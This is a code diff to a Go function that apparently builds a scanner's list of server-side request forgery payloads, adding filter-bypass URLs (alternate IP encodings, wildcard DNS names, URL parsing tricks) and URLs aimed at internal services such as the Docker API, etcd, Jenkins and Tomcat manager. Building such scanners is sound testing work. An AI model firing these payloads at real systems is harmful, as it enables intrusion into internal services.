@@ -274,13 +274,39 @@ func getSSRFPayloads() []string {
 		"dict://localhost:11211/stats",
 		"gopher://localhost:25/",
 		"gopher://localhost:6379/",
-		"gopher://localhost:9000/",
+		// ===== SSRF Bypass Techniques (15 個) =====
+		"http://127.0.0.1.xip.io/",
+		"http://127.0.0.1.nip.io/",
+		"http://localtest.me/",
+		"http://customer1.app.localhost/",
+		"http://127.0.1/",
+		"http://0/",
+		"http://0.0.0.0/",
+		"http://[::]/",
+		"http://127°0°0°1/",
+		"http://127。0。0。1/",
+		"http://①②⑦.⓪.⓪.①/",
+		"http://127.0.0.1%00.example.com/",
+		"http://example.com@127.0.0.1/",
+		"http://127.0.0.1#@example.com/",
+		"http://[0:0:0:0:0:ffff:127.0.0.1]/",
 
-		// TODO: 繼續擴充到 100+ Payload
-		// - SSRF Bypass Techniques (IP Encoding, URL Parsing Tricks)
-		// - Internal Services (Elasticsearch, Jenkins, etc.)
-		// - DNS Rebinding Payloads
-		// - ... 更多高級 Payload
+		// ===== Internal Services (15 個) =====
+		"http://127.0.0.1:9200/", // Elasticsearch
+		"http://127.0.0.1:9200/_cluster/health",
+		"http://127.0.0.1:5000/", // Docker Registry/Flask
+		"http://127.0.0.1:8000/", // Common Web
+		"http://127.0.0.1:2375/", // Docker API
+		"http://127.0.0.1:2379/", // etcd
+		"http://127.0.0.1:8090/", // Confluence
+		"http://127.0.0.1:8080/jenkins/", // Jenkins
+		"http://127.0.0.1:8080/manager/html", // Tomcat
+		"http://127.0.0.1:888", // cPanel/Plesk
+		"http://127.0.0.1:8888/", // Jupyter
+		"http://127.0.0.1:5984/", // CouchDB
+		"http://127.0.0.1:5601/", // Kibana
+		"http://127.0.0.1:15672/", // RabbitMQ
+		"http://127.0.0.1:27017/", // MongoDB
 	}
 }
 
